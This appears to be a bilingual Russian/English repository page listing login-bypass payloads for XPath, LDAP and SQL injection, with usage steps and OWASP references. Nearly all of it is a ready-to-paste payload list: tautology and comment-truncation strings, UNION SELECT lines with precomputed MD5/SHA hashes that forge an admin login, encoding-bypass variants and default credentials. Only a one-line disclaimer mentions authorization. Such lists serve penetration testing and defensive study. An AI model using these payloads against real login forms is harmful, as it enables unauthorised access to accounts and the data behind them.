### :rocket: Обход входа в систему с использованием нагрузок / Login Bypass Payloads

Этот список содержит полезные нагрузки для обхода входа в систему через XPath, LDAP и SQL-инъекции (в таком порядке).

**Способ использования (How to Use):**
1. Поместите первые 200 строк в качестве имени пользователя и пароля / Put the first 200 lines as the username and password.
2. Затем поместите весь список сначала в поле для имени пользователя, а затем в поле для пароля / Then, put the complete list in the username field first, and then in the password field.
3. При этом используйте какой-нибудь общий пароль (например, Pass1234.) или известное имя пользователя (например, admin) / Use some common password (like Pass1234.) or a known username (like admin).

:warning: Обратите внимание (Note): Это лишь инструмент для тестирования безопасности и не должен использоваться в реальных средах без соответствующего разрешения / This is just a security testing tool and should not be used in real environments without proper authorization.

#### Payload List/Список полезных нагрузок :

```
admin
password
1234
123456
root
toor
test
guest
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
1234
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
and 1=1
and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
like '%'
or 0=0 --
or 0=0 #
or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or a=a--
' or a=a–
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
') or ('x'='x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
"
'-- 2
"-- 2
'='
0'&lt;'2
"="
0"&lt;"2
')
")
')-- 2
')/*
')#
")-- 2
") #
")/*
')-('
')&('
')^('
')*('
')=('
0')&lt;('2
")-("
")&("
")^("
")*("
")=("
0")&lt;("2
'-''-- 2
'-''#
'-''/*
'&''-- 2
'&''#
'&''/*
'^''-- 2
'^''#
'^''/*
'*''-- 2
'*''#
'*''/*
'=''-- 2
'=''#
'=''/*
0'&lt;'2'-- 2
0'&lt;'2'#
0'&lt;'2'/*
"-""-- 2
"-""#
"-""/*
"&""-- 2
"&""#
"&""/*
"^""-- 2
"^""#
"^""/*
"*""-- 2
"*""#
"*""/*
"=""-- 2
"=""#
"=""/*
0"&lt;"2"-- 2
0"&lt;"2"#
0"&lt;"2"/*
')-''-- 2
')-''#
')-''/*
')&''-- 2
')&''#
')&''/*
')^''-- 2
')^''#
')^''/*
')*''-- 2
')*''#
')*''/*
')=''-- 2
')=''#
')=''/*
0')&lt;'2'-- 2
0')&lt;'2'#
0')&lt;'2'/*
")-""-- 2
")-""#
")-""/*
")&""-- 2
")&""#
")&""/*
")^""-- 2
")^""#
")^""/*
")*""-- 2
")*""#
")*""/*
")=""-- 2
")=""#
")=""/*
0")&lt;"2-- 2
0")&lt;"2#
0")&lt;"2/*
'oR'2
'oR'2'-- 2
'oR'2'#
'oR'2'/*
'oR'2'oR'
'oR(2)-- 2
'oR(2)#
'oR(2)/*
'oR(2)oR'
'oR 2-- 2
'oR 2#
'oR 2/*
'oR 2 oR'
'oR/**/2-- 2
'oR/**/2#
'oR/**/2/*
'oR/**/2/**/oR'
"oR"2
"oR"2"-- 2
"oR"2"#
"oR"2"/*
"oR"2"oR"
"oR(2)-- 2
"oR(2)#
"oR(2)/*
"oR(2)oR"
"oR 2-- 2
"oR 2#
"oR 2/*
"oR 2 oR"
"oR/**/2-- 2
"oR/**/2#
"oR/**/2/*
"oR/**/2/**/oR"
'oR'2'='2
'oR'2'='2'oR'
'oR'2'='2'-- 2
'oR'2'='2'#
'oR'2'='2'/*
'oR 2=2-- 2
'oR 2=2#
'oR 2=2/*
'oR 2=2 oR'
'oR/**/2=2-- 2
'oR/**/2=2#
'oR/**/2=2/*
'oR/**/2=2/**/oR'
'oR(2)=2-- 2
'oR(2)=2#
'oR(2)=2/*
'oR(2)=(2)oR'
'oR'2'='2' LimIT 1-- 2
'oR'2'='2' LimIT 1#
'oR'2'='2' LimIT 1/*
'oR(2)=(2)LimIT(1)-- 2
'oR(2)=(2)LimIT(1)#
'oR(2)=(2)LimIT(1)/*
"oR"2"="2
"oR"2"="2"oR"
"oR"2"="2"-- 2
"oR"2"="2"#
"oR"2"="2"/*
"oR 2=2-- 2
"oR 2=2#
"oR 2=2/*
"oR 2=2 oR"
"oR/**/2=2-- 2
"oR/**/2=2#
"oR/**/2=2/*
"oR/**/2=2/**/oR"
"oR(2)=2-- 2
"oR(2)=2#
"oR(2)=2/*
"oR(2)=(2)oR"
"oR"2"="2" LimIT 1-- 2
"oR"2"="2" LimIT 1#
"oR"2"="2" LimIT 1/*
"oR(2)=(2)LimIT(1)-- 2
"oR(2)=(2)LimIT(1)#
"oR(2)=(2)LimIT(1)/*
'oR true-- 2
'oR true#
'oR true/*
'oR true oR'
'oR(true)-- 2
'oR(true)#
'oR(true)/*
'oR(true)oR'
'oR/**/true-- 2
'oR/**/true#
'oR/**/true/*
'oR/**/true/**/oR'
"oR true-- 2
"oR true#
"oR true/*
"oR true oR"
"oR(true)-- 2
"oR(true)#
"oR(true)/*
"oR(true)oR"
"oR/**/true-- 2
"oR/**/true#
"oR/**/true/*
"oR/**/true/**/oR"
'oR'2'LiKE'2
'oR'2'LiKE'2'-- 2
'oR'2'LiKE'2'#
'oR'2'LiKE'2'/*
'oR'2'LiKE'2'oR'
'oR(2)LiKE(2)-- 2
'oR(2)LiKE(2)#
'oR(2)LiKE(2)/*
'oR(2)LiKE(2)oR'
"oR"2"LiKE"2
"oR"2"LiKE"2"-- 2
"oR"2"LiKE"2"#
"oR"2"LiKE"2"/*
"oR"2"LiKE"2"oR"
"oR(2)LiKE(2)-- 2
"oR(2)LiKE(2)#
"oR(2)LiKE(2)/*
"oR(2)LiKE(2)oR"
admin
admin'-- 2
admin'#
admin"-- 2
admin"#
ffifdyop
' UniON SElecT 1,2-- 2
' UniON SElecT 1,2,3-- 2
' UniON SElecT 1,2,3,4-- 2
' UniON SElecT 1,2,3,4,5-- 2
' UniON SElecT 1,2#
' UniON SElecT 1,2,3#
' UniON SElecT 1,2,3,4#
' UniON SElecT 1,2,3,4,5#
'UniON(SElecT(1),2)-- 2
'UniON(SElecT(1),2,3)-- 2
'UniON(SElecT(1),2,3,4)-- 2
'UniON(SElecT(1),2,3,4,5)-- 2
'UniON(SElecT(1),2)#
'UniON(SElecT(1),2,3)#
'UniON(SElecT(1),2,3,4)#
'UniON(SElecT(1),2,3,4,5)#
" UniON SElecT 1,2-- 2
" UniON SElecT 1,2,3-- 2
" UniON SElecT 1,2,3,4-- 2
" UniON SElecT 1,2,3,4,5-- 2
" UniON SElecT 1,2#
" UniON SElecT 1,2,3#
" UniON SElecT 1,2,3,4#
" UniON SElecT 1,2,3,4,5#
"UniON(SElecT(1),2)-- 2
"UniON(SElecT(1),2,3)-- 2
"UniON(SElecT(1),2,3,4)-- 2
"UniON(SElecT(1),2,3,4,5)-- 2
"UniON(SElecT(1),2)#
"UniON(SElecT(1),2,3)#
"UniON(SElecT(1),2,3,4)#
"UniON(SElecT(1),2,3,4,5)#
'||'2
'||2-- 2
'||'2'||'
'||2#
'||2/*
'||2||'
"||"2
"||2-- 2
"||"2"||"
"||2#
"||2/*
"||2||"
'||'2'='2
'||'2'='2'||'
'||2=2-- 2
'||2=2#
'||2=2/*
'||2=2||'
"||"2"="2
"||"2"="2"||"
"||2=2-- 2
"||2=2#
"||2=2/*
"||2=2||"
'||2=(2)LimIT(1)-- 2
'||2=(2)LimIT(1)#
'||2=(2)LimIT(1)/*
"||2=(2)LimIT(1)-- 2
"||2=(2)LimIT(1)#
"||2=(2)LimIT(1)/*
'||true-- 2
'||true#
'||true/*
'||true||'
"||true-- 2
"||true#
"||true/*
"||true||"
'||'2'LiKE'2
'||'2'LiKE'2'-- 2
'||'2'LiKE'2'#
'||'2'LiKE'2'/*
'||'2'LiKE'2'||'
'||(2)LiKE(2)-- 2
'||(2)LiKE(2)#
'||(2)LiKE(2)/*
'||(2)LiKE(2)||'
"||"2"LiKE"2
"||"2"LiKE"2"-- 2
"||"2"LiKE"2"#
"||"2"LiKE"2"/*
"||"2"LiKE"2"||"
"||(2)LiKE(2)-- 2
"||(2)LiKE(2)#
"||(2)LiKE(2)/*
"||(2)LiKE(2)||"
')oR('2
')oR'2'-- 2
')oR'2'#
')oR'2'/*
')oR'2'oR('
')oR(2)-- 2
')oR(2)#
')oR(2)/*
')oR(2)oR('
')oR 2-- 2
')oR 2#
')oR 2/*
')oR 2 oR('
')oR/**/2-- 2
')oR/**/2#
')oR/**/2/*
')oR/**/2/**/oR('
")oR("2
")oR"2"-- 2
")oR"2"#
")oR"2"/*
")oR"2"oR("
")oR(2)-- 2
")oR(2)#
")oR(2)/*
")oR(2)oR("
")oR 2-- 2
")oR 2#
")oR 2/*
")oR 2 oR("
")oR/**/2-- 2
")oR/**/2#
")oR/**/2/*
")oR/**/2/**/oR("
')oR'2'=('2
')oR'2'='2'oR('
')oR'2'='2'-- 2
')oR'2'='2'#
')oR'2'='2'/*
')oR 2=2-- 2
')oR 2=2#
')oR 2=2/*
')oR 2=2 oR('
')oR/**/2=2-- 2
')oR/**/2=2#
')oR/**/2=2/*
')oR/**/2=2/**/oR('
')oR(2)=2-- 2
')oR(2)=2#
')oR(2)=2/*
')oR(2)=(2)oR('
')oR'2'='2' LimIT 1-- 2
')oR'2'='2' LimIT 1#
')oR'2'='2' LimIT 1/*
')oR(2)=(2)LimIT(1)-- 2
')oR(2)=(2)LimIT(1)#
')oR(2)=(2)LimIT(1)/*
")oR"2"=("2
")oR"2"="2"oR("
")oR"2"="2"-- 2
")oR"2"="2"#
")oR"2"="2"/*
")oR 2=2-- 2
")oR 2=2#
")oR 2=2/*
")oR 2=2 oR("
")oR/**/2=2-- 2
")oR/**/2=2#
")oR/**/2=2/*
")oR/**/2=2/**/oR("
")oR(2)=2-- 2
")oR(2)=2#
")oR(2)=2/*
")oR(2)=(2)oR("
")oR"2"="2" LimIT 1-- 2
")oR"2"="2" LimIT 1#
")oR"2"="2" LimIT 1/*
")oR(2)=(2)LimIT(1)-- 2
")oR(2)=(2)LimIT(1)#
")oR(2)=(2)LimIT(1)/*
')oR true-- 2
')oR true#
')oR true/*
')oR true oR('
')oR(true)-- 2
')oR(true)#
')oR(true)/*
')oR(true)oR('
')oR/**/true-- 2
')oR/**/true#
')oR/**/true/*
')oR/**/true/**/oR('
")oR true-- 2
")oR true#
")oR true/*
")oR true oR("
")oR(true)-- 2
")oR(true)#
")oR(true)/*
")oR(true)oR("
")oR/**/true-- 2
")oR/**/true#
")oR/**/true/*
")oR/**/true/**/oR("
')oR'2'LiKE('2
')oR'2'LiKE'2'-- 2
')oR'2'LiKE'2'#
')oR'2'LiKE'2'/*
')oR'2'LiKE'2'oR('
')oR(2)LiKE(2)-- 2
')oR(2)LiKE(2)#
')oR(2)LiKE(2)/*
')oR(2)LiKE(2)oR('
")oR"2"LiKE("2
")oR"2"LiKE"2"-- 2
")oR"2"LiKE"2"#
")oR"2"LiKE"2"/*
")oR"2"LiKE"2"oR("
")oR(2)LiKE(2)-- 2
")oR(2)LiKE(2)#
")oR(2)LiKE(2)/*
")oR(2)LiKE(2)oR("
admin')-- 2
admin')#
admin')/*
admin")-- 2
admin")#
') UniON SElecT 1,2-- 2
') UniON SElecT 1,2,3-- 2
') UniON SElecT 1,2,3,4-- 2
') UniON SElecT 1,2,3,4,5-- 2
') UniON SElecT 1,2#
') UniON SElecT 1,2,3#
') UniON SElecT 1,2,3,4#
') UniON SElecT 1,2,3,4,5#
')UniON(SElecT(1),2)-- 2
')UniON(SElecT(1),2,3)-- 2
')UniON(SElecT(1),2,3,4)-- 2
')UniON(SElecT(1),2,3,4,5)-- 2
')UniON(SElecT(1),2)#
')UniON(SElecT(1),2,3)#
')UniON(SElecT(1),2,3,4)#
')UniON(SElecT(1),2,3,4,5)#
") UniON SElecT 1,2-- 2
") UniON SElecT 1,2,3-- 2
") UniON SElecT 1,2,3,4-- 2
") UniON SElecT 1,2,3,4,5-- 2
") UniON SElecT 1,2#
") UniON SElecT 1,2,3#
") UniON SElecT 1,2,3,4#
") UniON SElecT 1,2,3,4,5#
")UniON(SElecT(1),2)-- 2
")UniON(SElecT(1),2,3)-- 2
")UniON(SElecT(1),2,3,4)-- 2
")UniON(SElecT(1),2,3,4,5)-- 2
")UniON(SElecT(1),2)#
")UniON(SElecT(1),2,3)#
")UniON(SElecT(1),2,3,4)#
")UniON(SElecT(1),2,3,4,5)#
')||('2
')||2-- 2
')||'2'||('
')||2#
')||2/*
')||2||('
")||("2
")||2-- 2
")||"2"||("
")||2#
")||2/*
")||2||("
')||'2'=('2
')||'2'='2'||('
')||2=2-- 2
')||2=2#
')||2=2/*
')||2=2||('
")||"2"=("2
")||"2"="2"||("
")||2=2-- 2
")||2=2#
")||2=2/*
")||2=2||("
')||2=(2)LimIT(1)-- 2
')||2=(2)LimIT(1)#
')||2=(2)LimIT(1)/*
")||2=(2)LimIT(1)-- 2
")||2=(2)LimIT(1)#
")||2=(2)LimIT(1)/*
')||true-- 2
')||true#
')||true/*
')||true||('
")||true-- 2
")||true#
")||true/*
")||true||("
')||'2'LiKE('2
')||'2'LiKE'2'-- 2
')||'2'LiKE'2'#
')||'2'LiKE'2'/*
')||'2'LiKE'2'||('
')||(2)LiKE(2)-- 2
')||(2)LiKE(2)#
')||(2)LiKE(2)/*
')||(2)LiKE(2)||('
")||"2"LiKE("2
")||"2"LiKE"2"-- 2
")||"2"LiKE"2"#
")||"2"LiKE"2"/*
")||"2"LiKE"2"||("
")||(2)LiKE(2)-- 2
")||(2)LiKE(2)#
")||(2)LiKE(2)/*
")||(2)LiKE(2)||("
' UnION SELeCT 1,2`
' UnION SELeCT 1,2,3`
' UnION SELeCT 1,2,3,4`
' UnION SELeCT 1,2,3,4,5`
" UnION SELeCT 1,2`
" UnION SELeCT 1,2,3`
" UnION SELeCT 1,2,3,4`
" UnION SELeCT 1,2,3,4,5`
' or 1=1 limit 1 -- -+
'="or'
Pass1234.
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
%A8%27 Or 1=1-- 2
%8C%A8%27 Or 1=1-- 2
%bf' Or 1=1 -- 2
%A8%27 Or 1-- 2
%8C%A8%27 Or 1-- 2
%bf' Or 1-- 2
%A8%27Or(1)-- 2
%8C%A8%27Or(1)-- 2
%bf'Or(1)-- 2
%A8%27||1-- 2
%8C%A8%27||1-- 2
%bf'||1-- 2
%A8%27) Or 1=1-- 2
%8C%A8%27) Or 1=1-- 2
%bf') Or 1=1 -- 2
%A8%27) Or 1-- 2
%8C%A8%27) Or 1-- 2
%bf') Or 1-- 2
%A8%27)Or(1)-- 2
%8C%A8%27)Or(1)-- 2
%bf')Or(1)-- 2
%A8%27)||1-- 2
%8C%A8%27)||1-- 2
%bf')||1-- 2
```

#### References/Ссылки :

###### SQL Injection/SQL-инъекция

* 👉 https://owasp.org/www-community/attacks/SQL_Injection

###### SQL Injection Prevention Cheat Sheet/Шпаргалка по предотвращению SQL-инъекций

* 👉 https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

###### XPath Injection/Инъекция XPath

* 👉 https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection

###### LDAP Injection Prevention Cheat Sheet/Шпаргалка по предотвращению инъекций LDAP

* 👉 https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html

###### SQL Injection/sql инъекция

* 👉 https://wiki.owasp.org/index.php/SQL_Injection

###### XPATH Injection/Инъекция XPATH

* 👉 https://wiki.owasp.org/index.php/XPATH_Injection

###### Leaflet on preventing LDAP injections/Памятка по предотвращению LDAP-инъекций

* 👉 https://wiki.owasp.org/index.php/LDAP_Injection_Prevention_Cheat_Sheet


#### Recommended books/Рекомендуемые книги :

* [Learning XSLT: A Hands-On Introduction to XSLT and XPath/Изучение XSLT: практическое введение в XSLT и XPath](https://www.google.nl/books/edition/Learning_XSLT/Z2b-6zG5zhMC?hl=ru&gbpv=0)

* [Understanding and Deploying LDAP Directory Services/Понимание и развертывание служб каталогов LDAP](https://www.google.nl/books/edition/Understanding_and_Deploying_LDAP_Directo/fcW1xl1BejUC?hl=ru&gbpv=0)

* [SQL Injection Attacks and Defense/Атаки и защита от SQL-инъекций](https://www.google.nl/books/edition/SQL_Injection_Attacks_and_Defense/KKqiht2IsrcC?hl=ru&gbpv=0)
